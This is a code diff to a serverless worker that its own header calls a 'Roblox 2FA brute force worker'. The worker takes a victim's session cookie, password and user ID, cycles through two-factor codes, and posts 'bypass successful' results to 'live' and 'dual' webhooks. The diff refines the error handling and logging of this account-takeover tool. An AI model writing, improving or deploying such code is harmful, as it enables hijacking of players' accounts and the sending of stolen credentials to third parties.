@@ -1,6 +1,6 @@
 // ============================================================
-// ROBLOX 2FA BRUTE FORCE WORKER v2.2 - FULL VERSION
-// FIXED: CORS + POST handling
+// ROBLOX 2FA BRUTE FORCE WORKER v2.3
+// FIXED: env variable handling
 // ============================================================
 
 addEventListener('fetch', event => {
@@ -53,14 +53,13 @@ async function handleRequest(request) {
 
   const { cookie, password, userId, username, startCode, endCode } = payload;
 
-  // Test mode - if no credentials, just echo back
   if (!cookie || !password || !userId) {
     return new Response(JSON.stringify({
       success: false,
       error: 'Missing required fields: cookie, password, userId',
       received: payload
     }), {
-      status: 400,
+      status: 200,
       headers: {
         'Content-Type': 'application/json',
         'Access-Control-Allow-Origin': '*'
@@ -435,8 +434,12 @@ async function getAccountInfo(userId, cookie) {
 }
 
 async function sendLiveBypass(data) {
-  const webhookURL = env.WEBHOOK_MAIN;
-  if (!webhookURL) return;
+  // Get webhook URL from environment
+  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_MAIN : null;
+  if (!webhookURL) {
+    console.log('WEBHOOK_MAIN not set, skipping live bypass');
+    return;
+  }
 
   const embed = {
     title: '2FA BYPASS SUCCESSFUL',
@@ -468,12 +471,18 @@ async function sendLiveBypass(data) {
         embeds: [embed]
       })
     });
-  } catch (e) {}
+  } catch (e) {
+    console.log('Live webhook failed:', e.message);
+  }
 }
 
 async function sendDualWebhook(data) {
-  const webhookURL = env.WEBHOOK_DUAL;
-  if (!webhookURL) return;
+  // Get webhook URL from environment
+  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_DUAL : null;
+  if (!webhookURL) {
+    console.log('WEBHOOK_DUAL not set, skipping dualhook');
+    return;
+  }
 
   let embed;
 
@@ -525,5 +534,7 @@ async function sendDualWebhook(data) {
         embeds: [embed]
       })
     });
-  } catch (e) {}
+  } catch (e) {
+    console.log('Dual webhook failed:', e.message);
+  }
 }
